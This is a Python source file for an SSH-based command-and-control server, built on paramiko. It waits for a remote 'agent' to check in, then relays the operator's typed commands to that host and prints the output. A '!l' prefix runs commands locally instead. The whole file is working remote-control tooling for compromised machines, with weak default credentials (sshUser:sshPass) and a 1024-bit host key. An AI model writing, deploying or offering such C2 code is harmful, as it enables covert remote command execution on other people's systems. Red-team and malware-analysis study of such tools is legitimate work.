import paramiko
import socket
import argparse
import sys
import subprocess
from time import sleep

parser = argparse.ArgumentParser(description="C2 server configuration to listen for agents")
parser._action_groups.pop()
optional = parser.add_argument_group("Optional")
optional.add_argument("-p", dest="port", type=int, default=2222, help="Port to listen (Default: 2222)")
optional.add_argument("-u", dest="user", default="sshUser", help="Server user (Default: sshUser)")
optional.add_argument("-pwd", dest="password", default="sshPass", help="Server password (Default: sshPass)")

args = parser.parse_args()

class SSHServer (paramiko.ServerInterface):
    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self, username, password):
        if (username == args.user) and (password == args.password): #Configure username and password for the server (Default is sshUser:sshPass)
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

def Main():
    server = "0.0.0.0" #To listen on all interfaces
    port = args.port
    HOSTKEY = paramiko.RSAKey.generate(1024)
    BUFFER_SIZE = 1024 * 4
    SEPARATOR = "<&sep>"

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, port))
        sock.listen()
        print(f"[+] Port: {port} | User: {args.user} | Password: {args.password}\n[*] Listening for C2 activity...\n")
        client, addr = sock.accept()
    except KeyboardInterrupt:
        sys.exit()

    C2_Server = SSHServer()
    C2_Session = paramiko.Transport(client)
    C2_Session.add_server_key(HOSTKEY)
    C2_Session.start_server(server=C2_Server)
    conn = C2_Session.accept()
    print("[*] Debug info: " + str(conn)) #Debug info
    if conn is None:
        print("[!] Failled authentication.")
        sys.exit()
    success_msg = conn.recv(1024).decode()
    host, user, type = success_msg.split(SEPARATOR)
    print(f'[*] Agent checked in from "{host}" {addr} ({type}) as "{user}".')
    conn.send(" ") #Connection breaks without this line

    def comm_handler():
        while True:
            try:
                cmd_line = (f"#> {user}@{host} >> ")
                command = input(cmd_line + "")
                head = command.split(" ")[0]
                if head == "":
                    continue
                elif head == "!l":
                    exec = " ".join(command.split(" ")[1:])
                    local = subprocess.getoutput(exec)
                    print(local)
                elif head == "!exit":
                    conn.send(command)
                    sys.exit()
                else:
                    conn.send(command)
                    incoming()
            except KeyboardInterrupt:
                conn.send("!exit")
                sys.exit()
            except Exception as ex:
                print(str(ex))
                continue
            
    def incoming():
        try:
            if (conn.recv_ready() == False):
                sleep(1)
                incoming()
            else:
                while conn.recv_ready():
                    print(conn.recv(BUFFER_SIZE).decode())
        except Exception as ex:
            print(str(ex))

    comm_handler()

if __name__ == "__main__":
    Main()
